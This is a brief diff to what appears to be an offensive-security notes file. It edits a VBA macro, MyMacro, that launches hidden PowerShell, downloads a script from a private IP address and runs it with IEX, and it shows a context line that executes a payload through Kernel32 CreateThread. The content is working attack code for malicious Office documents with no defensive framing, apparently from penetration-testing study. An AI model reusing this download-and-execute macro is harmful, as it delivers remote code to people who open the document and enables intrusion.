@@ -355,7 +355,7 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0); # execute the payload
 ```vb
 Sub MyMacro()
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.161/run2.txt') | IEX"
     Shell str, vbHide
 End Sub
 
